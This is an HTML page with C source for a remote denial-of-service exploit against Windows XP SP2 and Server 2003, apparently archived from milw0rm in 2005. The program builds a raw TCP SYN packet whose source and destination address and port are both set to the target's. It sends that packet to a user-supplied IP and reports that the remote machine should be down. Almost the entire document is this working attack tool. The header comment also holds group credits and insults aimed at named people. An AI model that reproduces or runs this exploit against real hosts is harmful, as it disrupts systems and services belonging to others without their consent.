<html><head><title>MS Windows XP/2003 Remote Denial of Service Exploit</title></head><pre>/* Added Line #1 - BSD_SOURCE!!!!  /str0ke */

#define _BSD_SOURCE

#include &lt;stdio.h&gt; 
#include &lt;ctype.h&gt; 
#include &lt;sys/socket.h&gt; 
#include &lt;netinet/in.h&gt; 
#include &lt;netinet/in_systm.h&gt; 
#include &lt;netinet/ip.h&gt; 
#include &lt;netinet/tcp.h&gt; 
#include &lt;sysexits.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;unistd.h&gt; 
#include &lt;sys/types.h&gt; 

/*  
Windows Server 2003 and XP SP2 remote DoS exploit 
Tested under OpenBSD 3.6 at WinXP SP 2 
Vuln by Dejan Levaja &lt;dejan_@_levaja.com&gt; , http://security.nnov.ru/docs7998.html
(c)oded by __blf 2005 RusH Security Team , http://rst.void.ru 
Gr33tz: zZz, Phoenix, MishaSt, Inck-vizitor 
Fuck lamerz: Saint_I, nmalykh, Mr. Clumsy 
All rights reserved. 
*/ 

//checksum function by r0ach 
u_short checksum (u_short *addr, int len) 
{ 
u_short *w = addr; 
int i = len; 
int sum = 0; 
u_short answer; 
while (i &gt; 0) 
{ 
sum += *w++; 
i-=2; 
} 
if (i == 1) sum += *(u_char *)w; 
sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); 
sum = sum + (sum &gt;&gt; 16); 
return (~sum); 
} 
int main(int argc, char ** argv) 
{ 
struct in_addr src, dst; 
struct sockaddr_in sin; 
struct _pseudoheader { 
struct in_addr source_addr; 
struct in_addr destination_addr; 
u_char zero; 
u_char protocol; 
u_short length; 
} pseudoheader; 
struct ip * iph; 
struct tcphdr * tcph; 
int mysock; 
u_char * packet; 
u_char * pseudopacket; 
int on = 1; 
if( argc != 3) 
{ 
fprintf(stderr, &quot;r57windos.c by __blf\n&quot;); 
fprintf(stderr, &quot;RusH Security Team\n&quot;); 
fprintf(stderr, &quot;Usage: %s &lt;dest ip&gt; &lt;dest port&gt;\n&quot;, argv[0]); 
return EX_USAGE; 
} 
if ((packet = (char *)malloc(sizeof(struct ip) + sizeof(struct tcphdr))) == NULL) 
{ 
perror(&quot;malloc()\n&quot;); 
return EX_OSERR; 
} 
inet_aton(argv[1], &amp;src); 
inet_aton(argv[1], &amp;dst); 
iph = (struct ip *) packet; 
iph-&gt;ip_v = IPVERSION; 
iph-&gt;ip_hl = 5; 
iph-&gt;ip_tos = 0; 
iph-&gt;ip_len = ntohs(sizeof(struct ip) + sizeof(struct tcphdr)); 
iph-&gt;ip_off = htons(IP_DF); 
iph-&gt;ip_ttl = 255; 
iph-&gt;ip_p = IPPROTO_TCP; 
iph-&gt;ip_sum = 0; 
iph-&gt;ip_src = src; 
iph-&gt;ip_dst = dst; 
tcph = (struct tcphdr *)(packet +sizeof(struct ip)); 
tcph-&gt;th_sport = htons(atoi(argv[2])); 
tcph-&gt;th_dport = htons(atoi(argv[2])); 
tcph-&gt;th_seq = ntohl(rand()); 
tcph-&gt;th_ack = rand(); 
tcph-&gt;th_off = 5; 
tcph-&gt;th_flags = TH_SYN;  // setting up TCP SYN flag here 
tcph-&gt;th_win = htons(512); 
tcph-&gt;th_sum = 0; 
tcph-&gt;th_urp = 0; 
pseudoheader.source_addr = src; 
pseudoheader.destination_addr = dst; 
pseudoheader.zero = 0; 
pseudoheader.protocol = IPPROTO_TCP; 
pseudoheader.length = htons(sizeof(struct tcphdr)); 
if((pseudopacket = (char *)malloc(sizeof(pseudoheader)+sizeof(struct tcphdr))) == NULL) 
{ 
perror(&quot;malloc()\n&quot;); 
return EX_OSERR; 
} 
memcpy(pseudopacket, &amp;pseudoheader, sizeof(pseudoheader)); 
memcpy(pseudopacket + sizeof(pseudoheader), packet + sizeof(struct ip), sizeof(struct tcphdr)); 
tcph-&gt;th_sum = checksum((u_short *)pseudopacket, sizeof(pseudoheader) + sizeof(struct tcphdr)); 
mysock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW); 
if(!mysock) 
{ 
perror(&quot;socket!\n&quot;); 
return EX_OSERR; 
} 
if(setsockopt(mysock, IPPROTO_IP, IP_HDRINCL, (char *)&amp;on, sizeof(on)) == -1) 
{ 
perror(&quot;setsockopt&quot;); 
shutdown(mysock, 2); 
return EX_OSERR; 
} 
sin.sin_family = PF_INET; 
sin.sin_addr = dst; 
sin.sin_port = htons(80); 
if(sendto(mysock, packet, sizeof(struct ip) + sizeof(struct tcphdr), 0, (struct sockaddr *)&amp;sin, sizeof(sin)) == -1) 
{ 
perror(&quot;sendto()\n&quot;); 
shutdown(mysock, 2); 
return EX_OSERR; 
} 
printf(&quot;Packet sent. Remote machine should be down.\n&quot;); 
shutdown(mysock, 2); 
return  EX_OK; 
} 

// milw0rm.com [2005-03-07]</pre></html>